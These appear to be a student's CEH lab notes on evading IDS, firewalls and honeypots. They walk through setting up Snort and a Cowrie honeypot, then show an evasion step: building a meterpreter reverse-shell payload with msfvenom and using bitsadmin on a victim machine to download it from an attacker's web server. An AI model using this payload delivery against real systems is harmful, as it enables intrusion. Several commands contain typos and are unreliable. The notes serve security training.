# Evading IDS, Firewalls, and Honeypots

more or less means to attempt to target a machine that is behind a firewall
be it attacking the target or getting info about the target that is behind the firewall


### detect intrusion

tool used
#### [[Snort]] [[windows]]

1. Install snort exe on the windows machine and Snort requires WinPcap to be installed on your machine.
2. Snort installs itself in C:\Snort
3. Navigate to the **etc folder** in the specified location, E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150\etc of the Snort rules; **copy snort.conf and paste it in C:\Snort\etc**.
4. Snort.conf is already present in C:\Snort\etc; replace the file with the newly copied file.
5. Copy the **so_rules,rules,preprocs_rules** folder from E:\CEH-Tools\CEHv13 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort\snortrules-snapshot-29150 and paste into C:\Snort.
6. Open Command Prompt window ; type cd C:\Snort\bin and press Enter to access the bin folder in the command prompt. Run snort command to initiate snort.
7. Snort initializes; wait for it to complete. Press Ctrl+C after some time, Snort exits and comes back to C:\Snort\bin.
8. Now type **snort -W**. This command lists your machine’s physical address, IP address, and Ethernet Drivers, but all are disabled by default.
9. Observe your Ethernet Driver index number and write it down (in this task, it is 1).
10 To enable the Ethernet Driver, in the command prompt, run command **snort -dev -i 1**.
11. You see a rapid scroll text in the command prompt, which means that the Ethernet Driver is enabled and working properly.
12. Leave the Snort command prompt window open and launch another command prompt window.
13. In a new command prompt, run **ping google.com** command.
14. This ping command triggers a Snort alert in the Snort command prompt with rapid scrolling text.
15.  Close both command prompt windows. The verification of Snort installation and the triggering alert is complete, and Snort is working correctly in verbose mode.
16. Configure the **snort.conf** file, located at **C:\Snort\etc**. and **Open** the **snort.conf** file with Notepad++.
17. Scroll down to the Step #1: Set the **network variables section** (Line 41) of the snort.conf file. In the **HOME_NET** line (Line 45), replace any with the IP addresses of the machine (target machine) on which Snort is running. Here, the **target(setup) machine is Windows 11** and the IP address is **10.10.1.11.**
18. Leave the EXTERNAL_NET any line as it is.
19.  If you have a DNS Server, then make changes in the **DNS_SERVERS** line by replacing $HOME_NET with your DNS Server IP address; otherwise, leave this line as it is DNS server is **8.8.8.8**.
20. The same applies to SMTP_SERVERS, HTTP_SERVERS, SQL_SERVERS, TELNET_SERVERS, and SSH_SERVERS.
21. Remember that if you do not have any servers running on your machine, leave the line as it is. DO NOT make any changes in that
22.  Scroll down to **RULE_PATH** (Line 104). In Line 104, replace **../rules with C:\Snort\rules** in Line 105, replace **../so_rules with C:\Snort\so_rules** and in Line 106, replace **../preproc_rules with C:\Snort\preproc_rules**.
**Navigate to C:\Snort\rules and create two text files**; name them **white_list** and **black_list** and change their file extensions from **.txt** to **.rules**.
  Note: To create a text file, right-click anywhere inside the rules window and navigate to New → Text Document.
23. While changing the extension, if any pop-up appears, click Yes.
24. Switch back to Notepad++, scroll down to the Step #4: **Configure dynamic loaded libraries section** (Line 238). Configure dynamic loaded libraries in this section.
25. Add the path to dynamic preprocessor libraries (Line 243); **replace /usr/local/lib/snort_dynamicpreprocessor/** with your dynamic preprocessor libraries folder location.
26. In this task, the dynamic preprocessor libraries are located at **C:\Snort\lib\snort_dynamicpreprocessor**.
27. At the path to base preprocessor (or dynamic) engine (Line 246), **replace /usr/local/lib/snort_dynamicengine/libsf_engine.so** with your base preprocessor engine **C:\Snort\lib\snort_dynamicengine\sf_engine.dll**.
28. **Ensure that the dynamic rules libraries (Line 249) is commented out**, as you have already configured the libraries in dynamic preprocessor libraries.
  **Note: : Add (space) in between # and dynamicdetection (Line 249).**
29. Scroll down to the **Step #5: Configure preprocessors section (Line 253)**, the listed preprocessor. This does nothing in IDS mode; however, it generates errors at runtime.
 **Comment out all the preprocessors listed in this section by adding ‘#’ and (space) before each preprocessor rule (261-265)**.
  Note: To ‘comment out’ is to render a block of code inert by turning it into a comment.
30. Scroll down to **line 321** and **delete lzma keyword and a (space)**. Note: Make sure you only delete "lzma" keyword.
31. Scroll down to **Step #6: Configure output plugins (Line 513)**. In this step, provide the location of the **classification.config** and **reference.config** files.
32. These two files are in **C:\Snort\etc**. Provide this location of files in the configure output plugins (in Lines 527 and 528) (i.e., **C:\Snort\etc\classification.config** and **C:\Snort\etc\reference.config**).
33. In **Step #6, add to line (529) output alert_fast: alerts.ids:** this command orders Snort to dump all logs into the alerts.ids file.
34. In the **snort.conf** file, **find and replace** the **ipvar** string with **var**. To do this, press Ctrl+H on the keyboard. The Replace window appears; enter ipvar in the Find what : text field, enter var in the Replace with : text field, and click Replace All.
  Note: You will get a notification saying **11 occurrences were replaced**.
35. By default, the string is ipvar, which is not recognized by Snort: replace with the var string, and then close the window. Note: Snort now supports multiple configurations based on VLAN Id or IP subnet within a single instance of Snort. This allows administrators to specify multiple snort configuration files and bind each configuration to one or more VLANs or subnets rather than running one Snort for each configuration required.
36. **Save the snort.conf** file by pressing Ctrl+S and close Notepad++ window. 51. Before running Snort, you need to enable detection rules in the Snort rules file. For this task, we have enabled the ICMP rule so that Snort can detect any host discovery ping probes directed at the system running Snort.
37. Navigate to **C:\Snort\rules** and **open the icmp-info.rules** file with Notepad++.
38. In **line 21**, type below line and save. Close the Notepad++ window. Note: The IP address (10.10.1.11) mentioned in $HOME_NET may vary when you perform this task.

```
alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.1.11 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;)

```
39. Open command prompt window, type **cd C:\Snort\bin** and press Enter.
40. Run command . Note: **replace X with your device ethernet index number**; in this task: **X is 1**.
```
 snort -iX -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii to start Snort
```
41.  If you receive a **fatal error**, you should first **verify that you have typed all modifications correctly into the snort.conf file**, and then search through the file for entries matching your fatal error message.
42. If you receive an error stating **“Could not create the registry key,” then run the command prompt as Administrator**.
43. Snort starts running in IDS mode. It first initializes output plug-ins, preprocessors, plug-ins, loads dynamic preprocessors libraries, rule chains of Snort, and then logs all signatures.
44. If you have **entered all command information correctly**, you **receive a comment stating Commencing packet processing (pid=xxxx) (the value of xxxx may be any number; in this task, it is 2132)**, as shown in the screenshot.
45. Leave the Snort command prompt running. and  Attack your own machine, and check whether Snort detects it or not.
46. Now, turn on **Windows Server 2019 machine (Attacker Machine)**. Click Ctrl+Alt+Delete to activate the machine and login with **Administrator/Pa$$w0rd**.
47. Open the command prompt and issue the command **ping 10.10.1.11 -t from the Attacker Machine**
    Note: 10.10.1.11 is the IP address of the Windows11. This IP address may differ when you perform the task
48. Click Windows 11 to return to the Windows 11 machine. Observe that Snort triggers an alarm, as shown in the screenshot:
49.  Press Ctrl+C to stop Snort; snort exits.
50. **Go to the C:\Snort\log\10.10.1.19** folder and **open the ICMP_ECHO.ids file** with Notepad++. You see that all the log entries are saved in the ICMP_ECHO.ids file.
Note: The folder name 10.10.1.19 might vary when you perform the task, depending on the IP address of the Windows 11 machine.

 


 




### deploying honeypot

tool used
#### Cowrie

```
sudo adduser --disbled-password cowrie
```

→ copy all the contents of the cowrie folder to `/home/ubuntu`

open a new terminal and `sudo su`
```bash
cd cowrie
```
```bash
pip install --upgrade -r requirements.txt
```
```bash
cd ..
```
```bash
chnmod -R 777 cowrie
```
```bash
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```
> this will redirect all the traffic meant for port 22 to the port 2222
> > -t nat = specifies which table the rule to be added *here NAT(Network Address Translation)*
> > -A PREROUTING = specifies which rule to be appended *here it means that it should be redirected before any routing decisions are made*
> > -p tcp = specifies for which protocol the rule is made *here TCP*
> > -dport 22= specifies the destination port *here 22 (common port for ssh)*
> > -j REDIRECT = specifies the rule *here it is to redirect*
> > --to-port = to which port the should be redirected *here 2222*
> > > as it is 2222 all the traffic meant for 22 will go to 2222

now we need to make it so that cowrie can use the port 22 without any root privileges

```bash
touch /etc/authbind/byport/22
```
```bash
chown cowrie:cowrie /etc/authbind/byport/22
```
```bash
chmod 770 /etc/authbind/byport/22
```

to create a virtual environment for cowrie
```bash
virtualenv python=python3 cowrie-env
```

exit the root privileges
```bash
exit
```

move into the cowrie and start the honeypot
```bash
cd cowrie
```
```bash
bin/cowrie start
```

now the honeypot is set for anyone to try and break into out computer
the logs of attempts on our honeypot are seen by reading
```bash
tail /var/logs/cowrie/cowrie.log
```
by default this command only shows the last 10 lines of the logs
if we want to see more we can do that by
```bash
tail -n <desired-length> /var/logs/cowrie/cowrie.log
```

---
now we simulate an attempt on our honeypot

tool used
#### [[PuTTy]]
#tool/linux #gui 
putty is a gui interface for ssh connections

in the attacker machine
first as an attacker we enumerate the target
```bash
nmap -sV -p- 10.10.1.9
```
we see ssh port is open (22)

```bash
putty
```
to open putty

→ enter the host name *here 10.10.1.9*
→ open
→ enter a random name *here ubuntu*
→ try a bunch of random passwords
→ we see that it doesn't open

> > on the honeypot system we can read the logs and see that someone is attempting to login

→ now enter the name as `root`
→ enter a random password
→ we are in *technically we are inside the honeypot*
→ but as an attacker we do not know that and we continue to poke around
→ try a bunch of commands ls -lha, whoami, pwd etc.

> > on the other hand we check progress on pot honeypot by reading the logs, and we can see all the commands and everything the attacker is trying to do in our pc

## Evade IDS/[[Firewall]]

tool used
#### [[BITSAdmin]] [[windows]]

in this lab we are simulating that we have already hacked the machine
and we need to transfer a file into the machine
but in normal case the file will eb detected by the firewall and won't be allowed inside
so instead of sending something inside, we go inside and ask for something to be delivered inside
hence the request will generate from the inside so it is less likely to be stopped by the firewall

but to implement this command first we need to have our `exploit.exe` in the right place

```bash
msfvenom -p windows/meterpreter/reverse_tcp lport=4444 lhost=10.10.1.13 -f exe -O Exploit.exe
```

```bash
mkdir /var/www/html/share
```
```bash
chmod -R 755 /var/www/html/share
```
```bash
chown -R www-data:www-data /var/www/html/share
```
```bash
service apache2 start
```

In Victim windows machine:

Turn on windows defender firewall and then do follow below cmd:

```PowerShell
bitsadmin /transfer exploit.exe http://10.10.1.12/share/exploit.exe c:\exploit.exe
```


this will create a file that is accessible via requests
we need to place our `exploit.exe` inside this share 
*exploit.exe is a place holder and it can be any payload or exploit with any name*

---
